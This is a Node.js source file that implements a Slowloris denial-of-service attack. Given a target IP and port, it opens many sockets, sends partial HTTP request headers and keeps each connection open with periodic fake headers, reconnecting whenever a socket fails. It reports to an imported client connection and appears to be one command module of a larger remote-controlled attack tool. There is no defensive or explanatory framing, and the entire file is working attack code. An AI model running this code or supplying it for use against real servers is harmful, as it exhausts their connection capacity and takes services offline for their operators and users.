import net from "net";
import { client } from "../client.js";

export default function slowLoris(ip, port, attackDuration, sockets) {
	if (port === undefined || port === "") {
		port = 80;
	}
	if (attackDuration === undefined || attackDuration === "") {
		attackDuration = 60000;
	}
	if (sockets === undefined || sockets === "") {
		sockets = 200;
	}

	setTimeout(() => {
		client.write("Attack completed!");
		return;
	}, attackDuration);

	let activeSockets = 0;
	let socketsTargetReached = false;

	const createSocket = () => {
		const socket = net.connect(port, ip, () => {
			if (++activeSockets == sockets) socketsTargetReached = true;

			if (!socketsTargetReached)
				client.write(
					`\nCreating ${sockets} sockets ... ${parseInt(
						(activeSockets / sockets) * 100
					)}`
				);

			socket.write("GET / HTTP/1.1\r\n");
			socket.write(`Host: ${ip}\r\n`);
			socket.write("Accept: */*\r\n");
			socket.write(
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\r\n"
			);

			setInterval(() => {
				socket.write(`KeepAlive: ${Math.random() * 1000}\r\n`);
			}, 500);
		});

		socket.setTimeout(0);

		socket.on("error", (err) => {
			socket.destroy();
			createSocket();
		});
	};

	for (let i = 0; i < sockets; i++) {
		createSocket();
	}

	setTimeout(() => {
		if (activeSockets === 0) {
			client.write(`\nCould not connect to ${ip}:${port}`);
			return;
		}
	}, 10000);
}
